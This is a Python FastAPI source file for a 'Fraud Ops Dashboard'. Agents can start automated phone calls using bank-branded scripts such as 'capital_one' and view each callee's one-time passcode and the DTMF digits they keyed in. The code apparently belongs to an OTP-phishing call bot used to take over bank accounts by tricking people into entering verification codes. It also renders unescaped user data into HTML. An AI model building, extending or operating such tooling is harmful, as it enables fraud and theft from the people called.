# ui.py
from fastapi import APIRouter, Request, Form
from fastapi.responses import HTMLResponse, RedirectResponse
from auth import require_role
from storage import call_logs, dtmf_logs
import requests, os

router = APIRouter()

# 🔐 LOGIN PAGE
@router.get("/login", response_class=HTMLResponse)
async def login():
    return """
    <h3>Agent Login</h3>
    <form method="post">
      <input name="token" placeholder="Agent Token" required />
      <button>Login</button>
    </form>
    """

@router.post("/login")
async def login_post(token: str = Form(...)):
    response = RedirectResponse("/ui", status_code=302)
    response.set_cookie("session", token, httponly=True)
    return response


# 📊 DASHBOARD
@router.get("/ui", response_class=HTMLResponse)
async def ui(request: Request):
    require_role(request, "agent")

    rows = ""
    for sid, data in call_logs.items():
        digits = "".join(dtmf_logs.get(sid, []))
        rows += f"""
        <tr>
          <td>{sid}</td>
          <td>{data['phone']}</td>
          <td>{data['script']}</td>
          <td>
            <details>
              <summary>Show OTP</summary>
              {data['otp']}
            </details>
          </td>
          <td>{digits}</td>
          <td>{data['result']}</td>
        </tr>
        """

    return f"""
    <h2>Fraud Ops Dashboard</h2>

    <h3>Manual Call</h3>
    <form method="post" action="/ui/call">
      <input name="phone" placeholder="+15551234567" required />
      <input name="otp" placeholder="OTP from upstream" required />
      <input name="script" value="capital_one" />
      <input name="language" value="en-US" />
      <button>Start Call</button>
    </form>

    <br/>

    <table border="1">
      <tr>
        <th>Session</th>
        <th>Phone</th>
        <th>Script</th>
        <th>OTP</th>
        <th>DTMF</th>
        <th>Result</th>
      </tr>
      {rows}
    </table>
    """


# 📞 MANUAL CALL TRIGGER
@router.post("/ui/call")
async def ui_call(
    request: Request,
    phone: str = Form(...),
    otp: str = Form(...),
    script: str = Form(...),
    language: str = Form(...)
):
    require_role(request, "agent")

    requests.post(
        f"https://{os.getenv('FLY_APP_NAME')}.fly.dev/fraud/manual-call",
        headers={"X-Auth-Token": os.getenv("ADMIN_TOKEN")},
        json={
            "phone": phone,
            "otp": otp,
            "script": script,
            "language": language
        }
    )

    return RedirectResponse("/ui", status_code=302)
